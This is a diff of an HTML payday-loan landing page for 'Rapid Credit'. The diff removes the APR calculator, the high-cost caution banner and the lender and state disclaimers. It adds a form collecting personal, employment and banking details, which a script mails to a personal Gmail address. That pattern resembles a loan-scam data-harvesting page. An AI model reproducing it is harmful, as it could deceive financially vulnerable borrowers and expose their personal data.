@@ -3,558 +3,490 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rapid Credit | Fast Online Loans</title>
+    <title>Rapid Credit | Fast Payday Loans</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* === BASIC STYLES === */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #f5f5f5; }
+        
+        /* Header */
+        .header { 
+            background: white; 
+            padding: 15px 20px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo { font-size: 28px; font-weight: bold; color: #0066ff; }
+        .logo span { color: #ff6600; }
+        .contact-header { text-align: right; }
+        .phone { color: #0066ff; font-weight: bold; font-size: 18px; }
+        
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #0066ff, #00ccff);
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .hero h1 { font-size: 36px; margin-bottom: 15px; }
+        
+        /* Form Container */
+        .form-container {
+            max-width: 800px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        
+        .form-section {
+            margin-bottom: 25px;
+            padding-bottom: 25px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .form-title {
+            color: #0066ff;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .row > div {
+            flex: 1;
+        }
+        
+        .amount-buttons {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        
+        .amount-btn {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #ddd;
+            background: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .amount-btn.active {
+            border-color: #0066ff;
+            background: #0066ff;
+            color: white;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        
+        .submit-btn {
+            background: #0066ff;
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        
+        .submit-btn:hover {
+            background: #0052cc;
+        }
+        
+        .disclaimer {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        
+        .contact-info {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .row { flex-direction: column; }
+            .amount-buttons { flex-wrap: wrap; }
+        }
+    </style>
 </head>
 <body>
-    <!-- Top Alert -->
-    <div class="top-alert">
-        <div class="container">
-            <i class="fas fa-exclamation-circle"></i>
-            <span>CAUTION: Payday loans are short-term, high-cost loans. APR can exceed 400%. Consider alternatives first.</span>
-        </div>
-    </div>
 
     <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <div class="header-content">
-                <div class="logo">
-                    <i class="fas fa-bolt"></i>
-                    <span class="logo-text">Rapid<span>Credit</span></span>
-                </div>
-                
-                <nav class="main-nav">
-                    <ul>
-                        <li><a href="#home">Home</a></li>
-                        <li><a href="#how-it-works">How It Works</a></li>
-                        <li><a href="#calculator">Calculator</a></li>
-                        <li><a href="#benefits">Benefits</a></li>
-                        <li><a href="#requirements">Requirements</a></li>
-                        <li><a href="#contact" class="btn-nav">Apply Now</a></li>
-                    </ul>
-                </nav>
-                
-                <div class="contact-info">
-                    <div class="phone">
-                        <i class="fas fa-phone"></i>
-                        <div>
-                            <span>Call Us</span>
-                            <a href="tel:+13055741900">+1 (305) 574-1900</a>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="mobile-menu-btn">
-                    <i class="fas fa-bars"></i>
-                </button>
-            </div>
+    <div class="header">
+        <div class="logo">
+            <i class="fas fa-bolt"></i> Rapid<span>Credit</span>
         </div>
-    </header>
+        <div class="contact-header">
+            <div class="phone">
+                <i class="fas fa-phone"></i> +1 (305) 574-1900
+            </div>
+            <div style="font-size: 14px; color: #666;">Call Us 24/7</div>
+        </div>
+    </div>
 
     <!-- Hero Section -->
-    <section class="hero" id="home">
-        <div class="container">
-            <div class="hero-content">
-                <div class="hero-text">
-                    <h1>Get <span class="highlight">Fast Cash</span> When You Need It Most</h1>
-                    <p class="subtitle">Apply online in minutes. Get approved instantly. Receive funds in as little as 24 hours.</p>
-                    
-                    <div class="hero-stats">
-                        <div class="stat">
-                            <h3>Up to $1,500</h3>
-                            <p>Loan Amount</p>
-                        </div>
-                        <div class="stat">
-                            <h3>5 Minute</h3>
-                            <p>Application</p>
-                        </div>
-                        <div class="stat">
-                            <h3>24-48 Hours</h3>
-                            <p>Funding Time</p>
-                        </div>
-                        <div class="stat">
-                            <h3>95%</h3>
-                            <p>Approval Rate</p>
-                        </div>
-                    </div>
-                    
-                    <div class="hero-buttons">
-                        <a href="#apply" class="btn btn-primary btn-large">
-                            <i class="fas fa-rocket"></i> Apply Now
-                        </a>
-                        <a href="#calculator" class="btn btn-secondary">
-                            <i class="fas fa-calculator"></i> Calculate Loan
-                        </a>
-                    </div>
-                    
-                    <div class="trust-badges">
-                        <div class="badge">
-                            <i class="fas fa-shield-alt"></i>
-                            <span>256-bit SSL Secure</span>
-                        </div>
-                        <div class="badge">
-                            <i class="fas fa-lock"></i>
-                            <span>Privacy Protected</span>
-                        </div>
-                        <div class="badge">
-                            <i class="fas fa-check-circle"></i>
-                            <span>No Hidden Fees</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="hero-form" id="apply">
-                    <div class="form-header">
-                        <h3>Quick Application</h3>
-                        <p>Start your application now</p>
-                    </div>
-                    
-                    <form id="loanApplicationForm" action="send_email.php" method="POST">
-                        <div class="form-group">
-                            <label for="loanAmount">How much do you need?</label>
-                            <div class="amount-selector">
-                                <button type="button" class="amount-btn" data-amount="300">$300</button>
-                                <button type="button" class="amount-btn" data-amount="500">$500</button>
-                                <button type="button" class="amount-btn active" data-amount="1000">$1,000</button>
-                                <button type="button" class="amount-btn" data-amount="1500">$1,500</button>
-                            </div>
-                            <input type="range" id="loanAmount" name="loanAmount" min="100" max="1500" step="100" value="1000" class="amount-slider">
-                            <div class="amount-display">
-                                <span id="amountValue">$1,000</span>
-                            </div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="purpose">Loan Purpose</label>
-                            <select id="purpose" name="purpose" required>
-                                <option value="">Select Purpose</option>
-                                <option value="emergency">Emergency Expense</option>
-                                <option value="medical">Medical Bills</option>
-                                <option value="car">Car Repair</option>
-                                <option value="utilities">Utilities</option>
-                                <option value="rent">Rent Payment</option>
-                                <option value="other">Other</option>
-                            </select>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="name">Full Name</label>
-                            <input type="text" id="name" name="name" placeholder="John Smith" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="email">Email Address</label>
-                            <input type="email" id="email" name="email" placeholder="john@example.com" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="phone">Phone Number</label>
-                            <input type="tel" id="phone" name="phone" placeholder="+1 (555) 123-4567" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="state">State of Residence</label>
-                            <select id="state" name="state" required>
-                                <option value="">Select State</option>
-                                <option value="AL">Alabama</option>
-                                <option value="AK">Alaska</option>
-                                <option value="AZ">Arizona</option>
-                                <!-- Add all states -->
-                            </select>
-                        </div>
-                        
-                        <div class="form-group checkbox-group">
-                            <input type="checkbox" id="terms" name="terms" required>
-                            <label for="terms">I agree to the <a href="#terms-modal">Terms & Conditions</a> and confirm I'm at least 18 years old</label>
-                        </div>
-                        
-                        <div class="form-disclaimer">
-                            <p><small>By submitting, you authorize Rapid Credit to contact you via phone, email, or SMS.</small></p>
-                        </div>
-                        
-                        <button type="submit" class="btn btn-primary btn-block">
-                            <i class="fas fa-paper-plane"></i> Submit Application
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
+    <div class="hero">
+        <h1>Get Fast Cash Today!</h1>
+        <p style="font-size: 18px;">Apply online in minutes • Same day approval • Money in 24 hours</p>
+    </div>
 
-    <!-- How It Works -->
-    <section class="how-it-works" id="how-it-works">
-        <div class="container">
-            <div class="section-header">
-                <h2>How It Works</h2>
-                <p>Get your money in three simple steps</p>
-            </div>
-            
-            <div class="steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-icon">
-                        <i class="fas fa-file-signature"></i>
-                    </div>
-                    <h3>Apply Online</h3>
-                    <p>Complete our simple 5-minute application. No paperwork or faxing required.</p>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-icon">
-                        <i class="fas fa-check-circle"></i>
-                    </div>
-                    <h3>Get Approved</h3>
-                    <p>Receive instant approval decision. We verify your information electronically.</p>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-icon">
-                        <i class="fas fa-money-bill-wave"></i>
-                    </div>
-                    <h3>Receive Funds</h3>
-                    <p>Get funds deposited directly to your bank account within 24 hours of approval.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+    <!-- Main Application Form -->
+    <div class="form-container">
+        <h2 style="color: #0066ff; text-align: center; margin-bottom: 30px;">
+            <i class="fas fa-file-alt"></i> Complete Loan Application
+        </h2>
 
-    <!-- Loan Calculator -->
-    <section class="calculator-section" id="calculator">
-        <div class="container">
-            <div class="section-header">
-                <h2>Loan Calculator</h2>
-                <p>See exactly how much you'll pay back</p>
-            </div>
-            
-            <div class="calculator-container">
-                <div class="calculator-controls">
-                    <div class="calc-group">
-                        <label for="calcAmount">Loan Amount</label>
-                        <div class="input-with-icon">
-                            <span class="input-icon">$</span>
-                            <input type="number" id="calcAmount" min="100" max="1500" value="1000" step="100">
-                        </div>
-                        <input type="range" id="calcAmountSlider" min="100" max="1500" value="1000" step="100">
+        <form id="loanForm" onsubmit="submitApplication(event)">
+            <!-- Loan Amount Section -->
+            <div class="form-section">
+                <h3 class="form-title"><i class="fas fa-dollar-sign"></i> Loan Amount</h3>
+                
+                <div class="form-group">
+                    <label>How much do you need? *</label>
+                    <div class="amount-buttons">
+                        <button type="button" class="amount-btn" data-amount="300">$300</button>
+                        <button type="button" class="amount-btn active" data-amount="500">$500</button>
+                        <button type="button" class="amount-btn" data-amount="750">$750</button>
+                        <button type="button" class="amount-btn" data-amount="1000">$1,000</button>
+                        <button type="button" class="amount-btn" data-amount="1500">$1,500</button>
                     </div>
-                    
-                    <div class="calc-group">
-                        <label for="calcTerm">Loan Term (Days)</label>
-                        <div class="term-selector">
-                            <button type="button" class="term-btn" data-days="7">7 Days</button>
-                            <button type="button" class="term-btn active" data-days="14">14 Days</button>
-                            <button type="button" class="term-btn" data-days="30">30 Days</button>
-                        </div>
-                        <input type="range" id="calcTermSlider" min="7" max="30" value="14" step="7">
-                    </div>
+                    <input type="hidden" id="loanAmount" name="loan_amount" value="500" required>
                 </div>
                 
-                <div class="calculator-results">
-                    <div class="result-card">
-                        <h4>Loan Details</h4>
-                        <div class="result-row">
-                            <span>Loan Amount</span>
-                            <span id="resultAmount">$1,000</span>
-                        </div>
-                        <div class="result-row">
-                            <span>Finance Charge</span>
-                            <span id="resultFee">$150</span>
-                        </div>
-                        <div class="result-row total">
-                            <span>Total Repayment</span>
-                            <span id="resultTotal">$1,150</span>
-                        </div>
-                        <div class="result-row highlight">
-                            <span>APR</span>
-                            <span id="resultAPR">391.07%</span>
-                        </div>
-                    </div>
-                    
-                    <div class="warning-box">
-                        <i class="fas fa-exclamation-triangle"></i>
-                        <p><strong>Important:</strong> This is an example calculation. Actual rates and terms may vary based on your state and eligibility.</p>
-                    </div>
+                <div class="form-group">
+                    <label for="loanPurpose">Purpose of Loan *</label>
+                    <select id="loanPurpose" name="purpose" required>
+                        <option value="">Select Purpose</option>
+                        <option value="Emergency">Emergency Expense</option>
+                        <option value="Medical">Medical Bills</option>
+                        <option value="Car">Car Repair</option>
+                        <option value="Rent">Rent Payment</option>
+                        <option value="Utilities">Utilities</option>
+                        <option value="Other">Other</option>
+                    </select>
                 </div>
             </div>
-        </div>
-    </section>
 
-    <!-- Benefits -->
-    <section class="benefits" id="benefits">
-        <div class="container">
-            <div class="section-header">
-                <h2>Why Choose Rapid Credit?</h2>
-                <p>We make getting a loan simple and transparent</p>
-            </div>
-            
-            <div class="benefits-grid">
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-clock"></i>
+            <!-- Personal Information -->
+            <div class="form-section">
+                <h3 class="form-title"><i class="fas fa-user"></i> Personal Information</h3>
+                
+                <div class="row">
+                    <div class="form-group">
+                        <label for="firstName">First Name *</label>
+                        <input type="text" id="firstName" name="first_name" placeholder="John" required>
                     </div>
-                    <h3>Fast Approval</h3>
-                    <p>Get a decision in minutes, not days. Our automated system processes applications quickly.</p>
+                    <div class="form-group">
+                        <label for="lastName">Last Name *</label>
+                        <input type="text" id="lastName" name="last_name" placeholder="Smith" required>
+                    </div>
                 </div>
                 
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-mobile-alt"></i>
-                    </div>
-                    <h3>Mobile Friendly</h3>
-                    <p>Apply from any device - smartphone, tablet, or computer. Our site works perfectly everywhere.</p>
+                <div class="form-group">
+                    <label for="dob">Date of Birth *</label>
+                    <input type="date" id="dob" name="dob" required>
                 </div>
                 
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-user-shield"></i>
-                    </div>
-                    <h3>Secure & Private</h3>
-                    <p>256-bit SSL encryption protects your data. We never sell your information to third parties.</p>
+                <div class="form-group">
+                    <label for="email">Email Address *</label>
+                    <input type="email" id="email" name="email" placeholder="john@example.com" required>
                 </div>
                 
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-badge-dollar"></i>
-                    </div>
-                    <h3>No Hidden Fees</h3>
-                    <p>Clear, upfront pricing. Know exactly what you'll pay with no surprises at the end.</p>
-                </div>
-                
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-headset"></i>
-                    </div>
-                    <h3>24/7 Support</h3>
-                    <p>Our customer service team is available around the clock to answer your questions.</p>
-                </div>
-                
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-sync-alt"></i>
-                    </div>
-                    <h3>Flexible Repayment</h3>
-                    <p>Options available for repayment extensions if needed. We work with you.</p>
+                <div class="form-group">
+                    <label for="phone">Phone Number *</label>
+                    <input type="tel" id="phone" name="phone" placeholder="(555) 123-4567" required>
                 </div>
             </div>
-        </div>
-    </section>
 
-    <!-- Requirements -->
-    <section class="requirements" id="requirements">
-        <div class="container">
-            <div class="requirements-container">
-                <div class="requirements-text">
-                    <h2>Basic Requirements</h2>
-                    <p>To qualify for a loan with Rapid Credit, you must meet these basic criteria:</p>
-                    
-                    <ul class="requirements-list">
-                        <li>
-                            <i class="fas fa-check-circle"></i>
-                            <span>At least 18 years old</span>
-                        </li>
-                        <li>
-                            <i class="fas fa-check-circle"></i>
-                            <span>U.S. citizen or permanent resident</span>
-                        </li>
-                        <li>
-                            <i class="fas fa-check-circle"></i>
-                            <span>Active checking account</span>
-                        </li>
-                        <li>
-                            <i class="fas fa-check-circle"></i>
-                            <span>Regular income source (minimum $800/month)</span>
-                        </li>
-                        <li>
-                            <i class="fas fa-check-circle"></i>
-                            <span>Valid email address and phone number</span>
-                        </li>
-                        <li>
-                            <i class="fas fa-check-circle"></i>
-                            <span>Not a resident of prohibited states</span>
-                        </li>
-                    </ul>
-                    
-                    <a href="#apply" class="btn btn-primary">
-                        <i class="fas fa-clipboard-check"></i> Check Eligibility
-                    </a>
+            <!-- Address Information -->
+            <div class="form-section">
+                <h3 class="form-title"><i class="fas fa-home"></i> Address</h3>
+                
+                <div class="form-group">
+                    <label for="address">Street Address *</label>
+                    <input type="text" id="address" name="address" placeholder="123 Main Street" required>
                 </div>
                 
-                <div class="requirements-image">
-                    <div class="image-container">
-                        <i class="fas fa-file-contract"></i>
+                <div class="row">
+                    <div class="form-group">
+                        <label for="city">City *</label>
+                        <input type="text" id="city" name="city" placeholder="Miami" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="state">State *</label>
+                        <select id="state" name="state" required>
+                            <option value="">Select State</option>
+                            <option value="FL">Florida</option>
+                            <option value="CA">California</option>
+                            <option value="TX">Texas</option>
+                            <option value="NY">New York</option>
+                            <option value="IL">Illinois</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="zip">ZIP Code *</label>
+                        <input type="text" id="zip" name="zip" placeholder="33101" required>
                     </div>
                 </div>
             </div>
-        </div>
-    </section>
 
-    <!-- Contact Section -->
-    <section class="contact-section" id="contact">
-        <div class="container">
-            <div class="section-header">
-                <h2>Contact Us</h2>
-                <p>We're here to help 24/7</p>
-            </div>
-            
-            <div class="contact-container">
-                <div class="contact-info">
-                    <div class="contact-card">
-                        <div class="contact-icon">
-                            <i class="fas fa-phone"></i>
-                        </div>
-                        <h3>Phone</h3>
-                        <p>Call us anytime</p>
-                        <a href="tel:+13055741900">+1 (305) 574-1900</a>
-                    </div>
-                    
-                    <div class="contact-card">
-                        <div class="contact-icon">
-                            <i class="fas fa-envelope"></i>
-                        </div>
-                        <h3>Email</h3>
-                        <p>Send us a message</p>
-                        <a href="mailto:kingrollex4@gmail.com">kingrollex4@gmail.com</a>
-                    </div>
-                    
-                    <div class="contact-card">
-                        <div class="contact-icon">
-                            <i class="fas fa-clock"></i>
-                        </div>
-                        <h3>Hours</h3>
-                        <p>Available 24/7</p>
-                        <span>Monday - Sunday</span>
-                    </div>
+            <!-- Employment Information -->
+            <div class="form-section">
+                <h3 class="form-title"><i class="fas fa-briefcase"></i> Employment</h3>
+                
+                <div class="form-group">
+                    <label for="employment">Employment Status *</label>
+                    <select id="employment" name="employment" required>
+                        <option value="">Select Status</option>
+                        <option value="Employed">Employed Full-Time</option>
+                        <option value="Part-Time">Employed Part-Time</option>
+                        <option value="Self">Self-Employed</option>
+                        <option value="Unemployed">Currently Unemployed</option>
+                    </select>
                 </div>
                 
-                <div class="contact-form">
-                    <h3>Send Us a Message</h3>
-                    <form id="contactForm" action="send_email.php" method="POST">
-                        <input type="hidden" name="form_type" value="contact">
-                        
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="contactName">Your Name</label>
-                                <input type="text" id="contactName" name="contactName" required>
-                            </div>
-                            <div class="form-group">
-                                <label for="contactEmail">Your Email</label>
-                                <input type="email" id="contactEmail" name="contactEmail" required>
-                            </div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="contactSubject">Subject</label>
-                            <input type="text" id="contactSubject" name="contactSubject" required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="contactMessage">Message</label>
-                            <textarea id="contactMessage" name="contactMessage" rows="5" required></textarea>
-                        </div>
-                        
-                        <button type="submit" class="btn btn-primary btn-block">
-                            <i class="fas fa-paper-plane"></i> Send Message
-                        </button>
-                    </form>
+                <div class="form-group">
+                    <label for="income">Monthly Income *</label>
+                    <select id="income" name="income" required>
+                        <option value="">Select Income</option>
+                        <option value="<1000">Under $1,000</option>
+                        <option value="1000-2000">$1,000 - $2,000</option>
+                        <option value="2000-3000">$2,000 - $3,000</option>
+                        <option value="3000-4000">$3,000 - $4,000</option>
+                        <option value=">4000">Over $4,000</option>
+                    </select>
                 </div>
             </div>
+
+            <!-- Banking Information -->
+            <div class="form-section">
+                <h3 class="form-title"><i class="fas fa-bank"></i> Banking</h3>
+                
+                <div class="form-group">
+                    <label for="bankName">Bank Name *</label>
+                    <input type="text" id="bankName" name="bank_name" placeholder="e.g., Chase, Bank of America" required>
+                </div>
+                
+                <div class="row">
+                    <div class="form-group">
+                        <label for="accountType">Account Type *</label>
+                        <select id="accountType" name="account_type" required>
+                            <option value="">Select Type</option>
+                            <option value="Checking">Checking</option>
+                            <option value="Savings">Savings</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="monthsBank">Months with Bank *</label>
+                        <select id="monthsBank" name="months_bank" required>
+                            <option value="">Select</option>
+                            <option value="<6">Less than 6 months</option>
+                            <option value="6-12">6-12 months</option>
+                            <option value="1-2">1-2 years</option>
+                            <option value="2+">More than 2 years</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Terms & Conditions -->
+            <div class="form-section">
+                <h3 class="form-title"><i class="fas fa-file-contract"></i> Terms & Conditions</h3>
+                
+                <div class="disclaimer">
+                    <p><strong>Important Notice:</strong> Payday loans are short-term loans with high interest rates. 
+                    APR can be 300-400%. Only borrow what you can repay.</p>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms1" required>
+                    <label for="terms1">I agree to the Terms & Conditions *</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms2" required>
+                    <label for="terms2">I confirm I am 18+ years old *</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms3" required>
+                    <label for="terms3">I authorize credit checks and agree to be contacted *</label>
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn">
+                <i class="fas fa-paper-plane"></i> SUBMIT APPLICATION
+            </button>
+        </form>
+
+        <div class="contact-info">
+            <h3><i class="fas fa-headset"></i> Need Help?</h3>
+            <p style="margin: 10px 0; font-size: 20px; color: #0066ff;">
+                <i class="fas fa-phone"></i> +1 (305) 574-1900
+            </p>
+            <p style="margin: 10px 0;">
+                <i class="fas fa-envelope"></i> kingrollex4@gmail.com
+            </p>
+            <p style="color: #666; font-size: 14px;">Available 24/7</p>
         </div>
-    </section>
+    </div>
 
     <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <div class="logo">
-                        <i class="fas fa-bolt"></i>
-                        <span class="logo-text">Rapid<span>Credit</span></span>
-                    </div>
-                    <p>Providing short-term financial solutions with transparency and integrity.</p>
-                    <div class="social-links">
-                        <a href="#"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                    </div>
-                </div>
-                
-                <div class="footer-section">
-                    <h4>Quick Links</h4>
-                    <ul>
-                        <li><a href="#home">Home</a></li>
-                        <li><a href="#how-it-works">How It Works</a></li>
-                        <li><a href="#calculator">Calculator</a></li>
-                        <li><a href="#benefits">Benefits</a></li>
-                        <li><a href="#requirements">Requirements</a></li>
-                    </ul>
-                </div>
-                
-                <div class="footer-section">
-                    <h4>Legal</h4>
-                    <ul>
-                        <li><a href="#privacy">Privacy Policy</a></li>
-                        <li><a href="#terms">Terms of Service</a></li>
-                        <li><a href="#disclosures">Disclosures</a></li>
-                        <li><a href="#licenses">State Licenses</a></li>
-                        <li><a href="#complaints">Complaints</a></li>
-                    </ul>
-                </div>
-                
-                <div class="footer-section">
-                    <h4>Contact Info</h4>
-                    <ul class="contact-info-list">
-                        <li>
-                            <i class="fas fa-phone"></i>
-                            <a href="tel:+13055741900">+1 (305) 574-1900</a>
-                        </li>
-                        <li>
-                            <i class="fas fa-envelope"></i>
-                            <a href="mailto:kingrollex4@gmail.com">kingrollex4@gmail.com</a>
-                        </li>
-                        <li>
-                            <i class="fas fa-map-marker-alt"></i>
-                            <span>Miami, FL</span>
-                        </li>
-                    </ul>
-                </div>
-            </div>
+    <div style="background: #333; color: white; text-align: center; padding: 20px; margin-top: 40px;">
+        <p>© 2024 Rapid Credit. All rights reserved.</p>
+        <p style="font-size: 12px; color: #999; margin-top: 10px;">
+            Not available in all states. Loans subject to approval.
+        </p>
+    </div>
+
+    <script>
+        // Amount Selection
+        document.querySelectorAll('.amount-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.amount-btn').forEach(b => {
+                    b.classList.remove('active');
+                });
+                this.classList.add('active');
+                document.getElementById('loanAmount').value = this.dataset.amount;
+            });
+        });
+
+        // Form Submission
+        function submitApplication(event) {
+            event.preventDefault();
             
-            <div class="footer-bottom">
-                <div class="disclaimer">
-                    <p><strong>Disclaimer:</strong> Rapid Credit is not a lender. We are a loan connection service. Loans are provided by third-party lenders. Not all applicants will qualify. Loan amounts, rates, and terms vary by state and lender. High-cost loans should be used for short-term financial needs only and not as a long-term solution.</p>
-                    
-                    <p><strong>State Restrictions:</strong> We do not lend in: AZ, AR, CO, CT, GA, MA, MD, NJ, NY, NC, PA, VT, WV, DC.</p>
-                    
-                    <p class="copyright">© 2024 Rapid Credit. All rights reserved.</p>
-                </div>
-            </div>
-        </div>
-    </footer>
+            // Get form data
+            const form = document.getElementById('loanForm');
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Check required fields
+            let valid = true;
+            form.querySelectorAll('[required]').forEach(field => {
+                if (!field.value.trim()) {
+                    valid = false;
+                    field.style.borderColor = 'red';
+                } else {
+                    field.style.borderColor = '#ddd';
+                }
+            });
+            
+            if (!valid) {
+                alert('Please fill all required fields (*)');
+                return;
+            }
+            
+            // Create email content
+            let emailBody = "RAPID CREDIT LOAN APPLICATION\n";
+            emailBody += "================================\n\n";
+            
+            // Add all data to email
+            emailBody += `LOAN AMOUNT: $${data.loan_amount}\n`;
+            emailBody += `PURPOSE: ${data.purpose}\n\n`;
+            
+            emailBody += `PERSONAL INFO:\n`;
+            emailBody += `Name: ${data.first_name} ${data.last_name}\n`;
+            emailBody += `DOB: ${data.dob}\n`;
+            emailBody += `Email: ${data.email}\n`;
+            emailBody += `Phone: ${data.phone}\n\n`;
+            
+            emailBody += `ADDRESS:\n`;
+            emailBody += `${data.address}\n`;
+            emailBody += `${data.city}, ${data.state} ${data.zip}\n\n`;
+            
+            emailBody += `EMPLOYMENT:\n`;
+            emailBody += `Status: ${data.employment}\n`;
+            emailBody += `Income: ${data.income}\n\n`;
+            
+            emailBody += `BANKING:\n`;
+            emailBody += `Bank: ${data.bank_name}\n`;
+            emailBody += `Account Type: ${data.account_type}\n`;
+            emailBody += `Months with Bank: ${data.months_bank}\n\n`;
+            
+            emailBody += `================================\n`;
+            emailBody += `Submitted: ${new Date().toLocaleString()}\n`;
+            
+            // Encode for URL
+            const subject = encodeURIComponent(`LOAN APPLICATION - ${data.first_name} ${data.last_name}`);
+            const body = encodeURIComponent(emailBody);
+            
+            // Open email app
+            window.location.href = `mailto:kingrollex4@gmail.com?subject=${subject}&body=${body}`;
+            
+            // Show success message
+            alert("✅ Application ready! Your email app will open.\n\nClick 'SEND' to submit your application to Rapid Credit.");
+            
+            // Reset form after 2 seconds
+            setTimeout(() => {
+                form.reset();
+                document.querySelector('.amount-btn[data-amount="500"]').classList.add('active');
+                document.getElementById('loanAmount').value = '500';
+            }, 2000);
+        }
 
-    <!-- Modals -->
-    <div class="modal" id="terms-modal">
-        <div class="modal-content">
-            <span class="close-modal">&times;</span>
-            <h3>Terms & Conditions</h3>
-            <div class="modal-body">
-                <!-- Terms content here -->
-                <p>Full terms and conditions content...</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Loading Spinner -->
-    <div class="loading-spinner" id="loadingSpinner">
-        <div class="spinner"></div>
-    </div>
-
-    <script src="script.js"></script>
+        // Age validation
+        document.getElementById('dob').addEventListener('change', function() {
+            const dob = new Date(this.value);
+            const today = new Date();
+            let age = today.getFullYear() - dob.getFullYear();
+            const monthDiff = today.getMonth() - dob.getMonth();
+            
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
+                age--;
+            }
+            
+            if (age < 18) {
+                alert('You must be at least 18 years old to apply.');
+                this.value = '';
+            }
+        });
+    </script>
 </body>
 </html>
